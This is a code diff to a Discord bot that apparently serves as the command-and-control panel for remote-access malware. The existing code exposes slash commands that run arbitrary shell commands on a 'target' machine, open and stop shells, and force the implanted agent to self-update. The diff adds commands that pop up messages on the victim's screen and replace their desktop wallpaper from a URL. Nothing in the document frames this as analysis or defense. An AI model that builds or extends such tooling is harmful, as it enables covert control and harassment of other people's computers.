@@ -217,7 +217,7 @@ async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str,
     await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
     return True
 
-# ------------------- SLASH COMMANDS (admin‑only commands removed) -------------------
+# ------------------- SLASH COMMANDS -------------------
 @bot.tree.command(name="run", description="Execute a shell command")
 async def run_command(interaction: discord.Interaction, command: str):
     await send_command_to_agent(interaction, f"run {command}")
@@ -297,6 +297,15 @@ async def shell_stop_command(interaction: discord.Interaction):
 @bot.tree.command(name="update", description="Force the agent to self‑update")
 async def update_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "update")
+
+# ------------------- NEW COMMANDS -------------------
+@bot.tree.command(name="message", description="Display a pop-up message on the target")
+async def message_command(interaction: discord.Interaction, text: str):
+    await send_command_to_agent(interaction, f"message {text}")
+
+@bot.tree.command(name="wallpaper", description="Change the target's desktop wallpaper from a URL")
+async def wallpaper_command(interaction: discord.Interaction, url: str):
+    await send_command_to_agent(interaction, f"wallpaper {url}")
 
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
